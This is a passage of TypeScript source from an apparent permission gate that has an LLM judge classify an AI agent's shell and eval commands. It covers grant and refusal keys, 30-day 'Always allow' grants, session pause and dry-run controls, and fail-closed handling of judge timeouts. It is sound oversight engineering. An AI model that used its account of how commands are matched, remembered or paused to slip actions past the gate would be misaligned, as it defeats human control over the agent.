		refusals.set(sessionId, list.filter(refusal => refusal.normalizedTarget !== target || refusal.cwd !== cwd));
	} catch {
		// Nothing to lift without a session id.
	}
}

/**
 * The strict identity of one action, shared by session grants (issue #32) and
 * refusal memory (issue #64). Authorization and memory must agree on what
 * "this action" is: flag tokens are KEPT (combined short flags split, then
 * sorted and deduped, so "-rf" and "-r -f" produce the same key) and only the
 * first non-flag argument survives. Lowercased, whitespace-collapsed, leading
 * `cd <path> &&` stripped, `./` argument spellings canonicalized. Force flags
 * leave the KEY but stay in the command text the model and the dialog see —
 * force-ness is judged there, not here.
 *
 * Grants are authorization, so this key must NOT collapse distinct actions:
 * "git push origin main" and "git push --force origin main" differ here;
 * refusing to notice that difference turned a grant into an overgrant.
 *
 * Refusal memory keys the same way. Its own old two-word key ("ssh raw-ovh",
 * "docker exec") made one refused remote cleanup a session-length trip wire
 * for every later read from that host: 152 of the blocks in the 2026-09-12
 * log window carried `prior refusal` as a reason. A refusal now covers the
 * action it names and nothing wider, and an approval lifts exactly that.
 */
export function normalizeGrantTarget(command: string): string {
	const collapsed = command.replace(/\s+/gu, " ").trim().toLowerCase();
	const stripped = extractLeadingCdTarget(collapsed)?.rest || collapsed;
	const words = stripped.split(" ").filter(word => word !== "");
	if (words.length === 0) return "";
	const lead = [words[0]];
	// git is the one two-word verb: the subverb is part of the identity. It
	// must be a word, not a flag.
	if (words[0] === "git" && words[1] !== undefined && !words[1].startsWith("-")) lead.push(words[1]);
	const flags = new Set<string>();
	let firstArg = "";
	for (const word of words.slice(lead.length)) {
		if (word.startsWith("-")) {
			// Combined short flags ("-rf" -> -r, -f) split so any spelling of the
			// same flags matches; long flags ("--force") and bare "-" stay whole.
			if (word.startsWith("--") || word.length <= 2) flags.add(word);
			else for (const ch of word.slice(1)) flags.add(`-${ch}`);
			continue;
		}
		if (firstArg === "") firstArg = word.replace(/^\.\//u, "");
	}
	return [...lead, ...[...flags].sort(), firstArg].filter(part => part !== "").join(" ");
}

/**
 * Exact-ish grant key for eval program text: the shell verb+argument shape
 * does not apply to program code, so the whole payload — lowercased,
 * whitespace-collapsed, `./` word spellings canonicalized — is the key. A
 * grant covers this exact text and nothing shorter.
 */
function normalizeEvalGrantTarget(code: string): string {
	return code
		.replace(/\s+/gu, " ")
		.trim()
		.toLowerCase()
		.split(" ")
		.map(word => word.replace(/^\.\//u, ""))
		.join(" ");
}

/**
 * The grant key for a bash command. Simple commands use the normalized
 * verb/flag/first-argument shape above. Compounds and substitutions use an
 * exact-text key instead: the whole payload the user approved is retained, so
 * a changed argument or an added segment cannot ride an earlier grant.
 */
function grantKeyForCommand(command: string): string {
	if (bashCommandSegments(command).length > 1 || command.includes("$(") || command.includes("`")) {
		// Preserve internal whitespace: inside quotes it can be payload data, and
		// across a newline it can change which shell command executes. Only trim
		// the outer padding that the shell ignores before parsing.
		return `exact:${command.trim()}`;
	}
	return normalizeGrantTarget(command);
}

function sessionGrants(sessionId: string): Grant[] {
	let list = grants.get(sessionId);
	if (!list) {
		list = [];
		grants.set(sessionId, list);
	}
	return list;
}

/** Record a session grant: this command's target, in this exact directory,
 *  may run ungated for the rest of the session. `scopeCwd` is the second
 *  directory the human's dialog put on screen for eval payloads that name a
 *  spawn directory of their own; it is part of the grant's identity, so a
 *  session that moves workspaces (`/move` rewrites ctx.cwd) cannot reuse an
 *  authorization the human gave while looking at the old one. */
function addGrant(ctx: ExtensionContext, key: string, cwd: string, evidenceFingerprint?: string, scopeCwd?: string): void {
	try {
		if (key === "") return;
		const sessionId = ctx.sessionManager.getSessionId();
		const list = sessionGrants(sessionId);
		// One grant per (target, directory, scope directory): re-approving
		// refreshes ts and moves the grant to newest instead of stacking
		// duplicates.
		const existing = list.findIndex(grant => grant.normalizedTarget === key && grant.cwd === cwd && grant.scopeCwd === scopeCwd);
		if (existing !== -1) list.splice(existing, 1);
		while (list.length >= GRANT_CAP) list.shift();
		list.push({ normalizedTarget: key, cwd, ts: Date.now(), evidenceFingerprint, ...(scopeCwd === undefined ? {} : { scopeCwd }) });
	} catch {
		// No session id, no grant; the caller's decision below is unchanged.
	}
}

/** The session's grant for this command's target and directories, if any. */
function matchingGrant(
	ctx: ExtensionContext,
	key: string,
	cwd: string,
	evidenceFingerprint?: string,
	scopeCwd?: string,
): Grant | undefined {
	try {
		if (key === "") return undefined;
		const cwdInput = cwd ?? "";
		return grants
			.get(ctx.sessionManager.getSessionId())
			?.find(
				grant =>
					grant.normalizedTarget === key &&
					grant.cwd === cwdInput &&
					grant.scopeCwd === scopeCwd &&
					grant.evidenceFingerprint === evidenceFingerprint,
			);
	} catch {
		return undefined;
	}
}

// ---------------------------------------------------------------------------
// Persistent grants ("Always allow", issue: identical commands re-prompting
// across sessions for days)
//
// A grant records a user's "Always allow" answer: this EXACT command text, in
// this exact directory, may run without further gating for 30 days across
// every session. Unlike the session grant above, the key is the whole command
// text — compounds included — because host static allow rules never match a
// multi-segment command, so `cd X && script` shapes can never be
// static-allowed and would re-prompt forever. Exactness is the safety
// argument: the consent covers only text the human actually saw, so an
// env-prefix spelling (`FOO=1 cmd`), a different cwd, or any edit to the
// command intentionally does NOT match. Failure modes fail toward "no grant":
// a missing or corrupt store reads as zero grants (the gate never crashes on
// it), and a failed write leaves the just-approved call allowed while simply
// not remembering it.
// The store is <dirname(omp-classifier.json)>/omp-classifier-grants.json
// — the config root, beside the config file, so the OMP_JEV_CONFIG test
// override relocates it like every other artifact. Shape: {version: 1,
// grants: [{cmd, cwd, ts}]}, pretty-printed for human inspection.
// ---------------------------------------------------------------------------

interface PersistentGrant {
	/** The exact full command text as approved in the dialog. */
	cmd: string;
	cwd: string;
	ts: number;
}

const PERSISTENT_GRANT_TTL_MS = 30 * 24 * 60 * 60 * 1000;
const PERSISTENT_GRANT_CAP = 500;

interface PersistentGrantCache {
	/** Path AND mtime form the key: the module cache outlives tests and
	 *  /classifier file swaps, which point the config (and store) elsewhere. */
	path: string;
	mtimeMs: number;
	grants: PersistentGrant[];
}
let persistentGrantCache: PersistentGrantCache | undefined;

/** Validate a parsed store file: unknown shapes are corruption, not errors.
 *  Drops malformed entries, prunes expired ones (30-day TTL), orders oldest
 *  first, and caps at PERSISTENT_GRANT_CAP by evicting the oldest. A wrong
 *  version is ignored wholesale — the next dialog write rebuilds the file. */
function sanitizePersistentGrantFile(raw: unknown): PersistentGrant[] {
	if (typeof raw !== "object" || raw === null) return [];
	const file = raw as { version?: unknown; grants?: unknown };
	if (file.version !== 1 || !Array.isArray(file.grants)) return [];
	const now = Date.now();
	const grants: PersistentGrant[] = [];
	for (const entry of file.grants) {
		if (typeof entry !== "object" || entry === null) continue;
		const grant = entry as { cmd?: unknown; cwd?: unknown; ts?: unknown };
		if (typeof grant.cmd !== "string" || grant.cmd === "") continue;
		if (typeof grant.cwd !== "string") continue;
		if (typeof grant.ts !== "number" || !Number.isFinite(grant.ts)) continue;
		if (now - grant.ts >= PERSISTENT_GRANT_TTL_MS) continue;
		grants.push({ cmd: grant.cmd, cwd: grant.cwd, ts: grant.ts });
	}
	grants.sort((a, b) => a.ts - b.ts);
	while (grants.length > PERSISTENT_GRANT_CAP) grants.shift();
	return grants;
}

/** Read the store: mtime-cached like the config, pruned in memory (a read
 *  never writes — the file is rewritten only by a dialog approval). */
function loadPersistentGrants(): PersistentGrant[] {
	const filePath = path.join(path.dirname(classifierConfigPath()), "omp-classifier-grants.json");
	try {
		const stat = fs.statSync(filePath);
		if (
			persistentGrantCache &&
			persistentGrantCache.path === filePath &&
			persistentGrantCache.mtimeMs === stat.mtimeMs
		) {
			return persistentGrantCache.grants;
		}
		const grants = sanitizePersistentGrantFile(JSON.parse(fs.readFileSync(filePath, "utf8")));
		persistentGrantCache = { path: filePath, mtimeMs: stat.mtimeMs, grants };
		return grants;
	} catch {
		// Missing, unreadable, or corrupt JSON: zero grants, cache dropped so a
		// later rewrite is re-read fresh. Never an error at the gate.
		persistentGrantCache = undefined;
		return [];
	}
}

/** A live (unexpired) grant for this EXACT command text and directory. The
 *  kill-switch short-circuits before any filesystem read. */
function matchingPersistentGrant(command: string, cwd: string): PersistentGrant | undefined {
	if (!readClassifierConfig().persistentGrants) return undefined;
	const now = Date.now();
	return loadPersistentGrants().find(
		grant => grant.cmd === command && grant.cwd === cwd && now - grant.ts < PERSISTENT_GRANT_TTL_MS,
	);
}

/** Record a persistent grant: prune expired entries, refresh-and-move any
 *  duplicate (cmd, cwd), evict oldest past the cap, then write atomically
 *  (tmp + rename, so a crash never leaves a torn store). A write failure is
 *  swallowed: the dialog already allowed THIS call, the memory is a bonus. */
function addPersistentGrant(command: string, cwd: string): void {
	if (!readClassifierConfig().persistentGrants) return;
	try {
		const now = Date.now();
		const grants = loadPersistentGrants().filter(grant => now - grant.ts < PERSISTENT_GRANT_TTL_MS);
		const existing = grants.findIndex(grant => grant.cmd === command && grant.cwd === cwd);
		if (existing !== -1) grants.splice(existing, 1);
		grants.push({ cmd: command, cwd, ts: now });
		while (grants.length > PERSISTENT_GRANT_CAP) grants.shift();
		const filePath = path.join(path.dirname(classifierConfigPath()), "omp-classifier-grants.json");
		fs.mkdirSync(path.dirname(filePath), { recursive: true });
		const tmp = `${filePath}.${process.pid}.tmp`;
		try {
			fs.writeFileSync(tmp, `${JSON.stringify({ version: 1, grants }, null, 2)}\n`);
			fs.renameSync(tmp, filePath);
		} finally {
			try {
				fs.rmSync(tmp, { force: true });
			} catch {
				// Best-effort temp cleanup; rename already consumed it on success.
			}
		}
		persistentGrantCache = undefined;
	} catch {
		// Unwritable store: this call stays allowed, nothing is remembered.
	}
}

/** The session's refusal for this command's target, or undefined. */
function priorRefusalFor(
	ctx: ExtensionContext,
	command: string,
	cwd = "",
	evidenceFingerprint?: string,
): Refusal | undefined {
	try {
		const target = normalizeGrantTarget(command);
		if (target === "") return undefined;
		return refusals.get(ctx.sessionManager.getSessionId())?.find(refusal => {
			if (refusal.normalizedTarget !== target || refusal.cwd !== cwd) return false;
			// Model refusals are a warning about the facts the judge saw, not a
			// permanent ban on a normalized verb. New evidence gets a fresh review;
			// human/critical/cap decisions remain sticky until explicitly approved.
			return refusal.source !== "model" || refusal.evidenceFingerprint === evidenceFingerprint;
		});
	} catch {
		return undefined;
	}
}

export default function (pi: ExtensionAPI) {
	// Settings come from the HOST module instance (`pi.pi`). A plugin-local
	// `import { settings }` resolves to a second copy of the singleton with no
	// global instance and throws "Settings not initialized".
	const settings = pi.pi.settings;
	let settingsWarned = false;

	// /settings renders only the host's compiled schema (no extension hook), so
	// the classifier exposes its own config through this command and a small
	// JSON file. Not every key needs a command argument; bare `/classifier`
	// prints the effective config and the file path.
	pi.registerCommand("classifier", {
		description:
			"View or set omp-classifier options: enabled, policy, timeoutMs, maxCommandLength, evidenceUserMessages, persistentGrants, shadowV3, reset, status, dry-run, off, on",
		getArgumentCompletions: (prefix: string) => {
			const keywords = ["enabled", "policy", "timeoutMs", "maxCommandLength", "evidenceUserMessages", "persistentGrants", "shadowV3", "reset", "status", "dry-run", "off", "on", "file"] as const;
			return keywords
				.filter(keyword => keyword.startsWith(prefix.toLowerCase()))
				.map(keyword => ({ label: keyword, value: keyword }));
		},
		handler: async (args, ctx) => {
			const [key, value] = args.trim().split(/\s+/u);
			const notify = (message: string, level: "info" | "error" = "info") => ctx.ui.notify(message, level);
			if (!key) {
				notify(`omp-classifier (${classifierConfigPath()}):\n${formatClassifierConfig(readClassifierConfig())}`);
				return;
			}
			if (key === "file") {
				notify(classifierConfigPath());
				return;
			}
			if (key === "dry-run") {
				// Everything after the key is the command text — including leading
				// spaces' significance is none (normalized anyway), but flags must
				// survive: split only twice.
				const commandText = args.trim().slice(key.length).trim();
				if (commandText === "") {
					notify("usage: /classifier dry-run <command>", "error");
					return;
				}
				// Fires the REAL tool_call handler once with the capture variable
				// set: every decision choke point records instead of acts (see the
				// dryRun comment at the module state). The handler reference is
				// declared below; commands can only fire after registration.
				const captured: { result: DryRunResult | undefined } = { result: undefined };
				dryRun = captured;
				try {
					await handleToolCall(
						{ type: "tool_call", toolCallId: `dry-run-${Date.now()}`, toolName: "bash", input: { command: commandText } },
						ctx,
					);
				} finally {
					dryRun = null;
				}
				const result = captured.result ?? {
					would: "allow",
					layer: "gate",
					why: "no gate decision recorded; the host's normal approval flow decides",
				} satisfies DryRunResult;
				notify(JSON.stringify(result, null, 2));
				return;
			}
			if (key === "status") {
				const report = buildStatusReport();
				const json = JSON.stringify(report, null, 2);
				let where: string;
				try {
					fs.mkdirSync(path.dirname(statusReportPath()), { recursive: true });
					fs.writeFileSync(statusReportPath(), `${json}\n`);
					where = `written to ${statusReportPath()}`;
				} catch {
					where = "status.json unwritable; dump below only";
				}
				// Full dump on disk; the toast gets a truncation so a long tail of
				// decisions cannot flood the pane.
				notify(`omp-classifier status — ${where}:\n${truncated(json, 1500)}`);
				return;
			}
			if (key === "reset") {
				writeClassifierConfig({ enabled: true, judgeBackend: DEFAULT_JUDGE_BACKEND, jevPolicy: {}, timeoutMs: DEFAULT_TIMEOUT_MS, maxCommandLength: DEFAULT_MAX_COMMAND_LENGTH, evidenceUserMessages: 3, persistentGrants: true, shadowV3: true });
				notify(`omp-classifier reset to defaults (${classifierConfigPath()})`);
				return;
			}
			if (key === "enabled") {
				if (value !== "true" && value !== "false") {
					notify("usage: /classifier enabled true|false", "error");
					return;
				}
				const next = writeClassifierConfig({ enabled: value === "true" });
				notify(`classifier enabled=${next.enabled}. Critical, env, and static-rule checks stay active either way.`);
				return;
			}
			if (key === "off" || key === "on") {
				// A throwing sessionManager must not take the command handler
				// down; report and leave the session state untouched.
				try {
					const sessionId = ctx.sessionManager.getSessionId();
					if (key === "off") {
						sessionOff.add(sessionId);
						notify("classification paused for this session only (/classifier on resumes). Critical, env, and static-rule checks stay active.");
					} else if (sessionOff.delete(sessionId)) {
						notify("classification resumed for this session.");
					} else {
						notify("classification was not paused for this session.");
					}
				} catch (err) {
					notify(`could not update the session pause: ${err instanceof Error ? err.message : String(err)}`, "error");
				}
				return;
			}
			if (key === "policy") {
				// Read-only on purpose: thresholds move together (a floor without
				// its confidence floor is not a stricter policy, just a different
				// one), so they are edited in the config file where the whole set
				// is visible at once. The merged view is what actually decides.
				const config = readClassifierConfig();
				notify(
					`classifier policy (defaults + overrides):\n${JSON.stringify(jevPolicyFor(config), null, 2)}\n` +
						`defaults: ${JSON.stringify(DEFAULT_JEV_POLICY)}\n` +
						`questions: ${CLASSIFIER_POLICY_HASH} (${QUESTIONS_CONTRACT})`,
				);
				return;
			}
			if (key === "timeoutMs") {
				const ms = Number(value);
				if (!Number.isFinite(ms) || ms <= 0) {
					notify("usage: /classifier timeoutMs <positive millis>", "error");
					return;
				}
				const next = writeClassifierConfig({ timeoutMs: ms });
				notify(`classifier timeoutMs=${next.timeoutMs}`);
				return;
			}
			if (key === "maxCommandLength") {
				const n = Number(value);
				if (!Number.isFinite(n) || n < MIN_COMMAND_LENGTH || n > MAX_COMMAND_LENGTH_CEILING) {
					notify(`usage: /classifier maxCommandLength <chars, ${MIN_COMMAND_LENGTH}-${MAX_COMMAND_LENGTH_CEILING}>`, "error");
					return;
				}
				const next = writeClassifierConfig({ maxCommandLength: n });
				notify(`classifier maxCommandLength=${next.maxCommandLength}`);
				return;
			}
			if (key === "evidenceUserMessages") {
				const n = Number(value);
				if (!Number.isFinite(n) || n < MIN_EVIDENCE_USER_MESSAGES || n > MAX_EVIDENCE_USER_MESSAGES) {
					notify(
						`usage: /classifier evidenceUserMessages <count, ${MIN_EVIDENCE_USER_MESSAGES}-${MAX_EVIDENCE_USER_MESSAGES}>`,
						"error",
					);
					return;
				}
				const next = writeClassifierConfig({ evidenceUserMessages: n });
				notify(`classifier evidenceUserMessages=${next.evidenceUserMessages}`);
				return;
			}
			if (key === "persistentGrants") {
				if (value !== "true" && value !== "false") {
					notify("usage: /classifier persistentGrants true|false", "error");
					return;
				}
				const next = writeClassifierConfig({ persistentGrants: value === "true" });
				notify(
					next.persistentGrants
						? "classifier persistentGrants=true. Stored Always-allow grants apply again."
						: "classifier persistentGrants=false. Stored grants are kept on disk but never read; the dialog hides Always allow.",
				);
				return;
			}
			if (key === "shadowV3") {
				if (value !== "true" && value !== "false") {
					notify("usage: /classifier shadowV3 true|false", "error");
					return;
				}
				const next = writeClassifierConfig({ shadowV3: value === "true" });
				notify(
					next.shadowV3
						? "classifier shadowV3=true. Each fresh classification also asks the jev-v3 judgment (two more Jev requests) and logs it; it decides nothing."
						: "classifier shadowV3=false. Only the live jev-v2 judgment runs.",
				);
				return;
			}
			notify(
				`unknown key "${key}". Keys: enabled, policy, timeoutMs, maxCommandLength, evidenceUserMessages, persistentGrants, shadowV3, reset, status, dry-run, off, on, file`,
				"error",
			);
		},
	});

	interface HostPolicy {
		rules: BashApprovalPatternRule[];
		bashPolicy: "allow" | "deny" | "prompt" | undefined;
	}

	/**
	 * Read the host's static bash policy. An SDK or isolated session may run with
	 * `options.settings` and never initialize the global singleton (sdk.ts:1273),
	 * in which case the proxy throws. Failing the whole call there would block
	 * every bash command in such a session; instead assume no static rules, so
	 * the gate classifies the command rather than bricking the tool.
	 */
	const readHostPolicy = (): HostPolicy => {
		try {
			const userPolicies: Record<string, unknown> = settings.get("tools.approval") ?? {};
			return {
				rules: parseBashApprovalPatternRules(settings.get("bash.patterns")),
				bashPolicy: normalizeUserPolicy(userPolicies.bash),
			};
		} catch (err) {
			if (!settingsWarned) {
				settingsWarned = true;
				pi.logger.warn(
					`classifier: settings unreadable (${err instanceof Error ? err.message : String(err)}); ` +
						`classifying every bash command and honoring no static rules`,
				);
			}
			return { rules: [], bashPolicy: undefined };
		}
	};

	/**
	 * The jev-v3 judgment in shadow (plan Phase 2 step 8): its own evidence
	 * builder, the jev-v3 battery and the authorization question in parallel,
	 * the literal match, the overlay flags, and the decision order. It runs
	 * beside the live jev-v2 judgment and decides nothing; its result rides the
	 * decision line as `v3`.
	 *
	 * Never throws: any failure becomes `{ error }`, because a measurement that
	 * breaks must not change the live outcome. The literal match reads only the
	 * recent window; the pinned first message reaches the judges and never the
	 * match, so an old request can't authorize a new command by itself.
	 */
	const shadowJevV3 = async (
		ctx: ExtensionContext,
		input: {
			command: string;
			language: "shell" | "code";
			cwd: string;
			timeoutMs: number;
			operatorContext?: string;
			pushProvenance?: GitPushProvenance;
			worktreeProvenance?: GitWorktreeProvenance;
			refProvenance?: GitRefProvenance[];
			networkProvenance?: NetworkProvenance;
			recordExtras: Record<string, unknown>;
		},
	): Promise<ShadowV3> => {
		const began = Date.now();
		try {
			const config = readClassifierConfig();
			let snapshot: UserEvidenceSnapshotV3 = { messages: [], ids: [] };
			try {
				snapshot = collectTaskEvidenceV3(ctx.sessionManager.getBranch() as ReadonlyArray<EvidenceBranchEntry>, config.evidenceUserMessages);
			} catch {
				// No branch in an isolated SDK context: no user evidence, as live.
			}
			const judgedMessages = snapshot.pinned ? [snapshot.pinned.text, ...snapshot.messages] : snapshot.messages;
			const judgedIds = snapshot.pinned ? [snapshot.pinned.id, ...snapshot.ids] : snapshot.ids;
			const userEvidence = judgedMessages.length > 0 ? { userMessages: judgedMessages, userMessageIds: judgedIds } : {};
			let sessionId: string | undefined;
			try {
				sessionId = ctx.sessionManager.getSessionId();
			} catch {
				sessionId = undefined;
			}
			// The session's own artifacts directory is its scratch space: a delete
			// the user named there may match, like one under the working directory.
			let sessionTempDir: string | undefined;
			try {
				sessionTempDir = ctx.sessionManager.getArtifactsDir() ?? undefined;
			} catch {
				sessionTempDir = undefined;
			}
			const shell = input.language === "shell";
			// The eval tool's code is no shell: it is one run-code action whose
			// arguments nothing here can name.
			const actions: ActionSummaryEntry[] = shell
				? summarizeActions({ command: input.command, taintedVars: sessionId ? (floorTaint.get(sessionId) ?? []) : [] })
				: [{ kind: "run-code", count: 1, targets: ["unnamed-arguments"] }];
			const judgment = await judgeJevV3(AbortSignal.timeout(input.timeoutMs), {
				riskState: buildJevState({
					command: input.command,
					workingDirectory: input.cwd,
					...userEvidence,
					...(input.operatorContext ? { operatorContext: input.operatorContext } : {}),
					...(input.pushProvenance !== undefined ? { gitPushProvenance: input.pushProvenance } : {}),
					...(input.worktreeProvenance !== undefined ? { gitWorktreeProvenance: input.worktreeProvenance } : {}),
					...(input.refProvenance !== undefined ? { gitRefProvenance: input.refProvenance } : {}),
					...(input.networkProvenance !== undefined ? { networkProvenance: input.networkProvenance } : {}),
					...(Object.keys(input.recordExtras).length > 0 ? { extra: input.recordExtras } : {}),
				}),
				authorizationState: buildAuthorizationState({ actions, ...userEvidence }),
				context: ctx,
				settings,
				// The shadow measures the judge that actually decides: same backend,
				// same credential path. Anything else would report a disagreement
				// between two judges as a policy disagreement.
				backend: config.judgeBackend,
			});
			const authorization = deriveAuthorization(judgment.authorization, DEFAULT_AUTHORIZATION_POLICY);
			const literal = shell
				? literalMatch({
						command: input.command,
						cwd: input.cwd,
						homeDir: os.homedir(),
						userMessages: snapshot.messages,
						...(snapshot.pinned ? { pinnedUserMessage: snapshot.pinned.text } : {}),
						...(sessionTempDir ? { sessionTempDir } : {}),
						resolveRealPath: realPathOf,
					})
				: undefined;
			const overlay = shell ? matchModerateRiskTokens(input.command, input.cwd) : evalRiskFlags(input.command);
			const decision = deriveDecisionOrder(
				{ risk: judgment.risk, authorization, literal, overlayFlags: overlay, headless: !ctx.hasUI },
				jevPolicyFor(config),
			);
			return {
				verdict: decision.verdict,
				branch: decision.branch,
				reasonCode: decision.reasonCode,
				authorization: authorization.level,
				namedFirm: authorization.namedFirm,
				literalMatched: literal === undefined ? null : literal.matched,
				overlay,
				ms: Date.now() - began,
				...(judgment.authorizationError ? { authorizationError: truncated(judgment.authorizationError, 160) } : {}),
			};
		} catch (error) {
			return { error: truncated(error instanceof Error ? error.message : String(error), 160), ms: Date.now() - began };
		}
	};

	/**
	 * Ask the native judgment module to judge one command. One judge call per
	 * classification, no retries of our own and no second pass: judgeBattery
	 * (jev-judge.ts) carries the whole battery, the native judge already
	 * retries its own transients and falls back to the chat chain, and the
	 * verdict is derived from the answer probabilities (jev.ts). A request
	 * that cannot be made, answered, or read surfaces as JevUnavailableError
	 * and becomes an UNAVAILABLE verdict, which the caller turns into a
	 * permission request — never a silent allow.
	 *
	 * `timeoutMs` is the deadline, and since #62 it is a race the plugin owns
	 * rather than an abort on the request (judgeBatteryUnderDeadline): the
	 * deadline still yields UNAVAILABLE and still opens the dialog right away,
	 * but the request keeps running, so the verdict that lands a beat late
	 * rides back on `Judgement.late` and can dismiss or refine that dialog
	 * instead of being discarded. Only the deadline gets that treatment: a real
	 * failure (HTTP error, missing key, unreadable body) has no late answer to
	 * offer and returns without a `late` handle, so its dialog is exactly what
	 * it was before.
	 *
	 * `cwd` is the directory the command RUNS in — the judge's
	 * `workingDirectory`. `startCwd` is the directory its text STARTS in, which
	 * is a different directory exactly when the caller resolved a `cd` out of
	 * the command's own text (the host's leading-`cd` extraction): the two
	 * provenance measurements walk the command's `cd` chain themselves, so
	 * they take `startCwd` with the unmodified text, or they apply the resolved
	 * `cd` a second time (round 4 review). It defaults to `cwd`, which is the
	 * same directory for a caller whose text carries no leading `cd`.
	 */
	const classify = async (
		ctx: ExtensionContext,
		command: string,
		cwd: string,
		timeoutMs: number,
		recordExtras: Record<string, unknown> = {},
		operatorContext?: string,
		evidenceSnapshot?: UserEvidenceSnapshot,
		language: "shell" | "code" = "shell",
		startCwd: string = cwd,
	): Promise<Judgement> => {
		const config = readClassifierConfig();
		const policy = jevPolicyFor(config);
		// Provenance-tiered evidence (issue #31). Default 3: the newest user
		// messages ride along by default; /classifier evidenceUserMessages 0
		// restores the pre-#31 shape — no user messages at all. The snapshot is
		// taken once per tool call by the caller so the cache key, the refusal
		// memory, and the grant scope all describe the same state the judge saw.
		const taskEvidence = evidenceSnapshot === undefined ? evidenceUserSnapshot(ctx) : evidenceSnapshot;
		const userMessages = taskEvidence?.messages;
		const hadUserEvidence = (userMessages?.length ?? 0) > 0;
		// Gate-measured git push provenance (issue #63). Runs the plumbing in
		// the repository the command's own `cd` chain reaches from `startCwd`;
		// a non-push command, a push the repo does not track, or a plumbing
		// failure leaves it undefined and the state carries no provenance —
		// the criteria then fall back to the syntax-level read.
		let pushProvenance: GitPushProvenance | undefined;
		try {
			pushProvenance = measureGitPushProvenance(command, startCwd);
		} catch {
			pushProvenance = undefined;
		}
		// Gate-measured worktree geometry (issue #69 slice C). Three side-effect
		// free plumbing calls in the target cwd; a cwd outside any working tree
		// (or a bare repository) leaves it undefined and the state carries no
		// geometry — the criteria then read the command's paths alone.
		let worktreeProvenance: GitWorktreeProvenance | undefined;
		try {
			worktreeProvenance = measureGitWorktreeProvenance(cwd);
		} catch {
			worktreeProvenance = undefined;
		}
		// Gate-measured ref state (issue #69 slice D): whether a branch delete
		// would orphan its commits, whether a path restore has anything to
		// discard, what a rebase would replay onto. Read-only plumbing; a command
		// that is none of the three shapes leaves it undefined and the criteria
		// read the syntax alone.
		let refProvenance: GitRefProvenance[] | undefined;
		try {
			refProvenance = measureGitRefProvenance(command, cwd);
		} catch {
			refProvenance = undefined;
		}
		// Gate-measured network provenance (issue #65), measured the same way
		// and in the same tier: the command's own URLs and remote-verb
		// destinations looked up in THIS machine's own naming (SSH config,
		// hosts file, compose file, docker config and docker port table). A
		// command that names no destination this machine knows yields undefined
		// and the state carries no field — absent is "nothing measured", never
		// "trusted".
		let networkProvenance: NetworkProvenance | undefined;
		try {
			networkProvenance = measureNetworkProvenance(command, startCwd);
		} catch {
			networkProvenance = undefined;
		}
		// Started before the live request so the two run in parallel; awaited
		// on both return paths below, and it never throws.
		const shadow = config.shadowV3
			? shadowJevV3(ctx, {
					command,
					language,
					cwd,
					timeoutMs,
					recordExtras,
					...(operatorContext ? { operatorContext } : {}),
					...(pushProvenance !== undefined ? { pushProvenance } : {}),
					...(worktreeProvenance !== undefined ? { worktreeProvenance } : {}),
					...(refProvenance !== undefined ? { refProvenance } : {}),
					...(networkProvenance !== undefined ? { networkProvenance } : {}),
				})
			: undefined;
		// Answers -> verdict, shared by the on-time and the late path: a late
		// SAFE is the same battery with the same evidence weight as an on-time
		// one, so it must be read by the same code, never by a shortcut written
		// for the late case (issue #62).
		const judgementFrom = async (answers: JevAnswers): Promise<Judgement> => {
			const decision = deriveJevDecision(answers, policy);
			// `decision.hazards` carries only the hazards that reached
			// hazardReview, so "fired" is presence, not a threshold re-check.
			// The destructive hazard is the one that names damage no user can
			// undo, so an UNSAFE it triggered reports as irreversible; every
			// other non-SAFE verdict is review-tier. UNAVAILABLE is kept in the
			// ladder because the verdict union allows it — a non-answer
			// mislabelled "review" would understate why nothing was decided.
			const destructive = decision.hazards.destructive_or_irreversible;
			const irreversible =
				decision.reasonCode.includes("destructive_or_irreversible") ||
				(destructive !== undefined && destructive >= policy.hazardBlock);
			const risk: Judgement["risk"] =
				decision.verdict === "SAFE"
					? "routine"
					: decision.verdict === "UNAVAILABLE"
						? "unavailable"
						: irreversible
							? "irreversible"
							: "review";
			// Authorization is a provenance question, not a hazard question:
			// "missing" only when the battery flagged it, "grounded" when the
			// question was asked and cleared against real user evidence, and
			// otherwise the action never depended on authorization at all.
			const authorization: Judgement["authorization"] =
				decision.hazards.unauthorized_consequential_action !== undefined
					? "missing"
					: hadUserEvidence
						? "grounded"
						: "not-required";
			const v3 = shadow ? { ...(await shadow), live: decision.verdict } : undefined;
			return annotateJudgement({
				verdict: decision.verdict,
				reason: decision.reason,
				reasonCode: decision.reasonCode,
				...(v3 ? { v3 } : {}),
				...(decision.persistRefusal ? {} : { persistRefusal: false }),
				risk,
				authorization,
				modelId: answers.model,
				jev: {
					model: answers.model,
					probabilities: answers.verdict.probabilities,
					hazards: answers.hazards,
					confidence: answers.verdict.confidence,
					blastRadius: answers.blastRadius.score,
					...(answers.usage ? { usage: answers.usage } : {}),
					latencyMs: answers.latencyMs,
				},
			});
		};
		const outcome = await judgeBatteryUnderDeadline({
			timeoutMs,
			state: buildJevState({
				command,
				workingDirectory: cwd,
				...(userMessages ? { userMessages } : {}),
				...(taskEvidence?.ids.length ? { userMessageIds: taskEvidence.ids } : {}),
				...(operatorContext ? { operatorContext } : {}),
				...(pushProvenance !== undefined ? { gitPushProvenance: pushProvenance } : {}),
				...(worktreeProvenance !== undefined ? { gitWorktreeProvenance: worktreeProvenance } : {}),
				...(refProvenance !== undefined ? { gitRefProvenance: refProvenance } : {}),
				...(networkProvenance !== undefined ? { networkProvenance } : {}),
				...(Object.keys(recordExtras).length > 0 ? { extra: recordExtras } : {}),
			}),
			// The host settings instance, not a plugin-local singleton copy:
			// the native resolver reads providers.judgmentProvider and the
			// credential store through it (see the header note on settings).
			context: ctx,
			settings,
			// Which transport answers (issue #84). Omitted, it is the host
			// path; an endpoint backend ignores `settings`/`context` entirely.
			backend: config.judgeBackend,
		});
		if (outcome.kind === "answered") return await judgementFrom(outcome.answers);
		if (outcome.kind === "failed") {
			// Fail closed, name the failure, and never cache it: a missing key,
			// a non-2xx, or a body whose answers do not match the battery says
			// nothing about the command, and a cached non-answer would keep the
			// session from re-asking once the endpoint recovers.
			const v3 = shadow ? { ...(await shadow), live: "UNAVAILABLE" as const } : undefined;
			return annotateJudgement({
				verdict: "UNAVAILABLE",
				reason: `Jev unavailable: ${truncated(outcome.error instanceof Error ? outcome.error.message : String(outcome.error), 160)}`,
				noCache: true,
				...(v3 ? { v3 } : {}),
			});
		}
		// The deadline fired. UNAVAILABLE and the dialog are what they always
		// were, but the request is still running: the reason names the deadline
		// instead of implying the gate broke, and requestPermission adds the
		// dialog's own line about the answer that may still arrive.
		const v3 = shadow ? { ...(await shadow), live: "UNAVAILABLE" as const } : undefined;
		const late = outcome.late;
		return annotateJudgement({
